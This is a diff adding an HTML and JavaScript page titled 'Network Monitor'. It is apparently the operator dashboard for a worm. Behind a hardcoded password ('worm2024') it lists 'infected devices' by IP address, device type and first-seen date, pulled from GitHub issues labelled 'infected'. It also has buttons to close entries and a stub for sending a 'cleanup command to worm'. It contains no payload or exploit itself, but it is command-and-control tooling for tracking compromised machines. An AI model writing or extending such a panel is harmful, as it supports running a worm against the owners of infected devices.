@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Network Monitor</title>
+    <style>
+        body { font-family: Arial; margin: 20px; }
+        .login { max-width: 300px; margin: 100px auto; }
+        .dashboard { display: none; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
+        .infected { background-color: #ffebee; }
+    </style>
+</head>
+<body>
+    <div class="login" id="loginForm">
+        <h3>Admin Login</h3>
+        <input type="password" id="password" placeholder="Enter admin password">
+        <button onclick="login()">Login</button>
+    </div>
+
+    <div class="dashboard" id="dashboard">
+        <h2>Infected Devices Monitor</h2>
+        <button onclick="refreshData()">Refresh</button>
+        <button onclick="exportData()">Export CSV</button>
+        <table id="devicesTable">
+            <thead>
+                <tr>
+                    <th>IP Address</th>
+                    <th>Device Type</th>
+                    <th>First Seen</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="devicesBody"></tbody>
+        </table>
+    </div>
+
+    <script>
+        const ADMIN_PASSWORD = "worm2024";
+        const REPO = "username/repo";
+        const TOKEN = "github_token";
+
+        function login() {
+            if(document.getElementById('password').value === ADMIN_PASSWORD) {
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                loadDevices();
+            } else {
+                alert("Wrong password!");
+            }
+        }
+
+        async function loadDevices() {
+            const response = await fetch(`https://api.github.com/repos/${REPO}/issues?labels=infected`);
+            const issues = await response.json();
+            
+            const tbody = document.getElementById('devicesBody');
+            tbody.innerHTML = '';
+            
+            issues.forEach(issue => {
+                const [ip, type, firstSeen] = issue.body.split('|');
+                const row = `<tr class="infected">
+                    <td>${ip}</td>
+                    <td>${type}</td>
+                    <td>${firstSeen}</td>
+                    <td>ACTIVE</td>
+                    <td>
+                        <button onclick="removeDevice(${issue.number})">Remove</button>
+                        <button onclick="cleanDevice(${issue.number})">Clean</button>
+                    </td>
+                </tr>`;
+                tbody.innerHTML += row;
+            });
+        }
+
+        function removeDevice(issueId) {
+            if(confirm("Remove this device from tracking?")) {
+                fetch(`https://api.github.com/repos/${REPO}/issues/${issueId}`, {
+                    method: 'PATCH',
+                    headers: {
+                        'Authorization': `token ${TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({state: 'closed'})
+                }).then(() => loadDevices());
+            }
+        }
+
+        function cleanDevice(issueId) {
+            // Send cleanup command to worm
+            alert("Clean command sent to device");
+            removeDevice(issueId);
+        }
+
+        function refreshData() { loadDevices(); }
+        
+        function exportData() {
+            // CSV export functionality
+            alert("Exporting data to CSV...");
+        }
+
+        // Auto-refresh every 30 seconds
+        setInterval(loadDevices, 30000);
+    </script>
+</body>
+</html>
